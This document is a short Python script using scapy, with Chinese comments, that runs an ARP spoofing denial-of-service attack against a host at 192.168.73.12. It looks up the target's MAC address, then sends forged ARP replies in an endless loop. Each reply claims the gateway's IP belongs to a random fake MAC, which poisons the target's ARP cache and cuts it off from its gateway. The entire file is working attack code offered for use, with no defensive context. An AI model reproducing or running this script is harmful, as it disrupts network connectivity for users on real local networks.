from scapy.all import ARP, Ether, sendp, srp, conf, get_if_list
import random
import time
target_ip = "192.168.73.12"  # 攻击目标（被刷ARP缓存的主机）
# 自动检测可用接口
iface = None
for i in get_if_list():
    if "VMnet" in i or "Ethernet" in i or "eth" in i:
        iface = i
        break
if not iface:
    iface = conf.iface
def get_mac(ip):
    """发送ARP请求，获取目标MAC"""
    ans, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
        timeout=2,
        retry=2,
        iface=iface,
        verbose=False
    )
    for s, r in ans:
        return r[Ether].src
    return None
gateway_ip = "192.168.73.79"
def arp_dos(target_ip, gateway_ip):
    target_mac = get_mac(target_ip)
    if not target_mac:
        print("[!] 无法获取目标MAC")
        return
    count = 0
    print("=== ARP 网关拒绝服务攻击启动 ===")
    print(f"[+] 目标主机: {target_ip}")
    print(f"[+] 攻击网关: {gateway_ip}")
    print(f"[+] 使用接口: {iface}\n")
    while True:
        fake_mac = "02:00:%02x:%02x:%02x:%02x" % (
            random.randint(0, 255),
            random.randint(0, 255),
            random.randint(0, 255),
            random.randint(0, 255)
        )
        pkt = Ether(dst=target_mac) / ARP(
            op=2,
            pdst=target_ip,
            psrc=gateway_ip,   # 网关 IP
            hwsrc=fake_mac,    #  假 MAC
            hwdst=target_mac
        )
        sendp(pkt, iface=iface, verbose=False)
        count += 1
        print(f"[{count}] 伪造网关ARP → {gateway_ip} is-at {fake_mac}")
        time.sleep(1)
try:
    arp_dos(target_ip,gateway_ip)
except KeyboardInterrupt:
    print("\n[!] 用户中止攻击。ARP DoS 停止。")

